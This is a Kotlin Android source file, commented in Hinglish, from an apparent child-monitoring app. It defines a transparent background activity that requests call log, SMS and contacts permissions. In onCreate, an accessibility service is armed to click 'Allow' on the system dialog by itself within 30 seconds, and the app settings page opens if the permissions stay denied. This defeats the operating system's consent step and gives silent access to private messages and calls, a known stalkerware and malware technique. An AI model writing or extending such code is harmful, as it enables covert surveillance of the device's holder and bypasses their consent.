package com.familyguard.child.ui

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.SystemClock
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import com.familyguard.child.data.Store

/**
 * Calls & SMS permissions ko BACKGROUND me maangne ke liye transparent activity —
 * CameraPermActivity ka exact counterpart. VC17 FIX:
 *
 * Wizard ka "calls" step DONE tab hota hai jab teen me se KOI EK permission mil
 * jaye (READ_CALL_LOG || READ_SMS || READ_CONTACTS). Call log grant ho gaya to
 * step ✓ dikh jata hai — par READ_SMS na mile (OEM auto-deny / "Don't ask again")
 * to SMS inbox sync HAMESHA ke liye dead reh jata hai, aur dashboard par false
 * "SMS permission OFF" warning atki rehti hai (data purana hi dikhata rahta hai).
 *
 * Ab parent ke "Sync now" par ye activity khulti hai (BAL-safe), teeno perms ka
 * system dialog aata hai aur a11y armed "calls" step par Allow khud click karta
 * hai. Agar dialog permanently dead hai (sab denied + rationale false) to app-
 * details settings page khud khul jata hai — wahan toggles se grant hota hai.
 */
class CallsPermActivity : ComponentActivity() {

    private val permLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { result ->
            // Permanent-denial recovery (MainActivity.maybeOpenPermSettings ka
            // activity-side twin): sab denied aur kisi par bhi rationale true
            // nahi = system dialog dobara KABHI nahi khulega — settings page.
            val allDenied = result.values.all { !it }
            if (allDenied && result.keys.isNotEmpty()) {
                val dead = result.keys.all {
                    !ActivityCompat.shouldShowRequestPermissionRationale(this, it)
                }
                if (dead) {
                    runCatching {
                        startActivity(
                            Intent(
                                Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                Uri.parse("package:$packageName")
                            ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        )
                    }
                }
            }
            finish()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!Store.paired || Store.released) {
            finish()
            return
        }
        // A11y auto-allow arm karo (wizard "calls" step) — dialog dikhTE hi
        // EnforcementService "Allow" click karta hai.
        Store.autoClickStep = "calls"
        Store.autoClickUntil = SystemClock.elapsedRealtime() + 30_000L
        runCatching {
            com.familyguard.child.service.EnforcementService.armGalleryAllow()
        }
        runCatching {
            permLauncher.launch(
                arrayOf(
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CONTACTS
                )
            )
        }.onFailure { finish() }
    }
}
